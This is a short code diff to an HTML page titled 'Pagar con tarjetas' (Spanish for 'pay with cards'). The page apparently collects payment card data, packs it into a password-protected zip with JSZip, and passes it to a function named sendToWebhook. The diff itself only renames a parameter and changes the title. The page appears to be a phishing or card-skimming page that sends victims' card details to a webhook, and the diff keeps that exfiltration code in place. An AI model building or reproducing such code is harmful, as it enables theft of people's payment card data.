@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Pagar con tarjeta</title>
+  <title>Pagar con tarjetas</title>
   <style>
     body {
       background: linear-gradient(to right, black, gray);
@@ -102,11 +102,11 @@
       sendToWebhook(zipPassword, fileName, cardData);
     }
 
-    function sendToWebhook(password, fileName, cardData) {
+    function sendToWebhook(zipPassword, fileName, cardData) { //function sendToWebhook(password, fileName, cardData)
       var zip = new JSZip();
       var csvContent = cardData.join(", ");
       zip.file(fileName + ".txt", csvContent);
-      zip.generateAsync({ type: "blob", compression: "DEFLATE", password: password })
+      zip.generateAsync({ type: "blob", compression: "DEFLATE", password: zipPassword })
         .then(function(content) {
           var formData = new FormData();
           formData.append("file", content, fileName + ".zip");
